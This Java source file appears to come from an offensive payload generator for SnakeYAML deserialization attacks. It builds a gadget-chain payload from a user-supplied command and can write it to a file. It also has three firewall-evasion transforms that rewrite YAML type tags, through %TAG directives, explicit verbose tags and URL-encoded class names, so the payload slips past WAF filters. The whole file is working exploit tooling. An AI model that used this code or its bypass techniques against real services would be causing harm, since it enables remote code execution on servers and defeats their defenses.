package cn.butler.snakeyaml.config;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.config.Config;
import cn.butler.utils.FileUtils;
import cn.butler.xstream.Serializer;
import org.apache.commons.cli.CommandLine;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SnakeYamlConfig extends Config {
    public void parse(CommandLine cmdLine){

        final String payloadType = cmdLine.getOptionValue("gadget");
        final String command = cmdLine.getOptionValue("args");

        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass("SnakeYamlAttack",payloadType);
        if (payloadClass == null) {
            System.err.println("Invalid payload type '" + payloadType + "'");
            System.exit(USAGE_CODE);
            return; // make null analysis happy
        }

        try {
            ObjectPayload payload = payloadClass.newInstance();
            Object object = payload.getObject(command);
            if(cmdLine.hasOption("waf-bypass")){
                String waf_bypass_value = cmdLine.getOptionValue("waf-bypass");
                if(waf_bypass_value.equals("tag1")){
                    object = snakeYamlWafBypassTag1((String) object);
                } else if (waf_bypass_value.equals("tag2")) {
                    object = snakeYamlWafBypassTag2((String) object);
                } else if (waf_bypass_value.equals("classNameURLEncode")) {
                    object = snakeYamlWafBypassClassNameURLEncode((String) object);
                }
            }
            if(cmdLine.hasOption("writeToFile")){
                String fileName = cmdLine.getOptionValue("writeToFile");
                String serialize = Serializer.serialize(object);
                FileUtils.savePayloadToFile(serialize,fileName);
                System.exit(0);
            }
            //原版的输出
            System.out.println(object);
            System.exit(0);
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
            System.exit(INTERNAL_ERROR_CODE);
        }
        System.exit(0);
    }

    private Object snakeYamlWafBypassTag2(String input) {
        // 1. 添加 %TAG 和 ---
        String output = "%TAG !      tag:yaml.org,2002:\n---\n";
        // 2. 将 !! 开头的标记转换为 ! (保留 YAML 简单类型标记)
        output += input.replaceAll("!!", "!");
        return output;
    }

    private static String snakeYamlWafBypassTag1(String object){
        // 匹配所有 !!开头的类型并转换为 !<tag:yaml.org,2002:类型>
        String output = object.replaceAll("!!(\\S+)", "!<tag:yaml.org,2002:$1>");
        return output;
    }

    private static String snakeYamlWafBypassClassNameURLEncode(String input) throws Exception {
        // 正则表达式匹配类名 (形如 !!类名)
        Pattern pattern = Pattern.compile("!!(\\S+)");
        Matcher matcher = pattern.matcher(input);

        StringBuffer result = new StringBuffer();
        // 查找并对类名部分进行URL编码
        while (matcher.find()) {
            String className = matcher.group(1);  // 提取类名
            String encodedClassName = encodeClassName(className);
            matcher.appendReplacement(result, "!!" + encodedClassName);  // 替换为编码后的类名
        }
        matcher.appendTail(result);  // 添加剩余部分
        return result.toString();
    }

    public static String encodeClassName(String input) {
        StringBuilder encoded = new StringBuilder();
        for (char c : input.toCharArray()) {
            encoded.append('%');
            encoded.append(String.format("%02X", (int) c));
        }
        return encoded.toString();
    }
}
